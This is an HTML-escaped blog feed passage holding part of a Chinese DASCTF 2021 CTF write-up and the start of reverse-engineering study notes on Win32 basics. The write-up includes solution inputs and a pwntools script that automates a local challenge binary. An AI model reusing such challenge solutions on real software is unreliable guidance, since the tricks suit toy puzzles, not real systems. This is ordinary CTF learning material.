		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;根据字符串就能看到比较的位置，密文减一下就行&lt;/p&gt;
&lt;h2 id=&#34;reeasy_math&#34;&gt;[RE]easy_math&lt;/h2&gt;
&lt;p&gt;几个加减法解一下就行，甚至不需要z3&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v20 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; v16 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61536369217D&lt;/span&gt;i64 )
    {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v19 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; v16 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x586531316F&lt;/span&gt;i64 )
      {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v18 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; v16 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5F3631626F4E&lt;/span&gt;i64 )
        {
          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v16 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v18 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v19 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC121F9FCC23A&lt;/span&gt;i64 )
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;完事之后需要把flag拼一下，而且第一个输入好像没有用？&lt;/p&gt;
&lt;p&gt;反正我的输入是这个&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;439904987003
107079497490813
448374321519
104755080884046
439904987003
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;repig_brain_king&#34;&gt;[RE]pig_brain_king&lt;/h2&gt;
&lt;p&gt;玩了一下，发现是个记忆游戏，字符串越来越长，逻辑没有细看，感觉可能找到了flag生成函数吧，不过不重要，pwntools玩通就完事了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./pig_brain_king.exe&amp;#39;&lt;/span&gt;)
context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;):
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;questions!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    ans &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()
    print (ans)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;enter:&amp;#39;&lt;/span&gt;)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(ans)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;脚本没写好，最后一关需要自己动手复制一下（手动狗头）&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;AK的人有点多，沉思（&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;miscgirlfriends-account&#34;&gt;[Misc]Girlfriend&amp;rsquo;s account&lt;/h2&gt;
&lt;p&gt;一开始还想着找个工具，然后发现各种bug&lt;/p&gt;
&lt;p&gt;但认认真真写代码转码是不可能的，这辈子也不可能的，用vscode批量操作一把梭不香吗&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;girl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.01&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;,
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.01&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.01&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;,
    &lt;span style=&#34;color:#75715e&#34;&gt;# ...&lt;/span&gt;
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.01&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.01&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,
]

spend &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; g &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; girl:
    spend &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; g
print (spend)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这账单，幸好没有npy&lt;/p&gt;
&lt;h2 id=&#34;miscblind&#34;&gt;[Misc]blind&lt;/h2&gt;
&lt;p&gt;压缩包里有俩“一样”的图片，用工具xor一看，发现只有一点蓝色，猜测可能是个盲水印，上网找工具装环境&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 162; 
			flex-basis: 389px&#34;
	&gt;
	&lt;a href=&#34;/post/dasctf-2021-09-writeup/output.png&#34; data-size=&#34;1751x1080&#34;&gt;
		&lt;img src=&#34;/post/dasctf-2021-09-writeup/output.png&#34;
			width=&#34;1751&#34;
			height=&#34;1080&#34;
			srcset=&#34;/post/dasctf-2021-09-writeup/output_hufef300d75bfc97572e31a5dd77fdb6e6_338010_480x0_resize_box_3.png 480w, /post/dasctf-2021-09-writeup/output_hufef300d75bfc97572e31a5dd77fdb6e6_338010_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;output.png&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;output.png&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;解出来发现是个盲文&lt;/p&gt;
&lt;p&gt;网上找了半天，才发现是拼音盲文，麻了&lt;/p&gt;
&lt;h2 id=&#34;crypto签到&#34;&gt;[Crypto]签到&lt;/h2&gt;
&lt;p&gt;说出来可能不信，这求解脚本是我在贴吧找到的&amp;hellip;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;discrete_log(c,mod(m,n))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>加密与解密学习笔记（持续更新ing）</title>
        <link>/post/note-of-book-encryption-and-decryption/</link>
        <pubDate>Sat, 25 Sep 2021 02:15:45 +0800</pubDate>
        
        <guid>/post/note-of-book-encryption-and-decryption/</guid>
        <description>&lt;img src="/post/note-of-book-encryption-and-decryption/cover.jpg" alt="Featured image of post 加密与解密学习笔记（持续更新ing）" /&gt;&lt;p&gt;suibiankankan&lt;/p&gt;
&lt;h2 id=&#34;基础知识&#34;&gt;基础知识&lt;/h2&gt;
&lt;h3 id=&#34;分析的一般途径和策略&#34;&gt;分析的一般途径和策略&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;学会软件的操作和使用方法 $\to$ 推测出软件的设计思想和编程思路&lt;/li&gt;
&lt;li&gt;静态分析：阅读反汇编的程序清单，利用人机交互的提示信息了解片段所完成的功能，宏观了解软件的编程思路&lt;/li&gt;
&lt;li&gt;动态跟踪：首先完成反反调试，并解密加密程序，了解初始化工作，获得各个模块之间的中间结果
&lt;ol&gt;
&lt;li&gt;粗跟踪：不跟踪调用等指令，仅根据执行结果分析程序的功能&lt;/li&gt;
&lt;li&gt;细跟踪：针对性跟踪分析关键模块&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;文本字符&#34;&gt;文本字符&lt;/h3&gt;
&lt;h4 id=&#34;ascii-和-unicode&#34;&gt;ASCII 和 Unicode&lt;/h4&gt;
&lt;p&gt;Unicode 是 ASCII 的扩展，所有字符都是 16 位&lt;/p&gt;
&lt;h4 id=&#34;字节存储顺序&#34;&gt;字节存储顺序&lt;/h4&gt;
&lt;p&gt;小端序（Little-endian）：高位字节存入高地址，低位字节存入低地址&lt;/p&gt;
&lt;p&gt;大端序（Big-endian）：高位字节存入低地址，低位字节存入高地址&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;字节序&lt;/th&gt;
&lt;th&gt;0&lt;/th&gt;
&lt;th&gt;1&lt;/th&gt;
&lt;th&gt;2&lt;/th&gt;
&lt;th&gt;3&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;大端序&lt;/td&gt;
&lt;td&gt;12&lt;/td&gt;
&lt;td&gt;34&lt;/td&gt;
&lt;td&gt;56&lt;/td&gt;
&lt;td&gt;78&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;小端序&lt;/td&gt;
&lt;td&gt;78&lt;/td&gt;
&lt;td&gt;56&lt;/td&gt;
&lt;td&gt;34&lt;/td&gt;
&lt;td&gt;12&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;windows&#34;&gt;Windows&lt;/h3&gt;
&lt;h4 id=&#34;win-32-api&#34;&gt;Win 32 API&lt;/h4&gt;
&lt;p&gt;32位API与64位API在名称和功能上基本没有变化&lt;/p&gt;
&lt;p&gt;Windows运转核心为DLL动态链接库&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;KERNEL32.DLL：操作系统核心功能服务，进程与线程控制、内存管理、文件访问等&lt;/li&gt;
&lt;li&gt;USER32.DLL：负责处理用户接口，包括键盘和鼠标输入、窗口和菜单管理等&lt;/li&gt;
&lt;li&gt;GDI：图形设备接口，允许程序在屏幕和打印机上显示文本和图形&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;windows消息机制&#34;&gt;Windows消息机制&lt;/h4&gt;
&lt;p&gt;Windows使用Message提供应用程序与应用程序、应用程序与操作系统之间的通信&lt;/p&gt;
&lt;p&gt;常用的函数如下：&lt;/p&gt;
&lt;h5 id=&#34;sendmessage&#34;&gt;SendMessage&lt;/h5&gt;
&lt;p&gt;调用一个窗口的窗口函数，将一条消息发送给那个窗口。除非消息处理完毕，否则不会返回&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;LRESULT &lt;span style=&#34;color:#a6e22e&#34;&gt;SendMessage&lt;/span&gt;(
	HWND hwnd,			&lt;span style=&#34;color:#75715e&#34;&gt;// 目的窗口的句柄
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	UINT Msg,			&lt;span style=&#34;color:#75715e&#34;&gt;// 消息标识符
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	WPARAM wParam,		&lt;span style=&#34;color:#75715e&#34;&gt;// 消息的WPARAM域
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	LPARAM lParam		&lt;span style=&#34;color:#75715e&#34;&gt;// 消息的LPARAM域
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;返回值&lt;/strong&gt;：消息投递成功，返回非零&lt;/p&gt;
&lt;h5 id=&#34;wm_command&#34;&gt;WM_COMMAND&lt;/h5&gt;
&lt;p&gt;当用户从菜单或按钮中选择一条命令或者一个控件时该消息被发送给它的父窗口，或者当一个快捷键被释放时发送该消息。&lt;/p&gt;
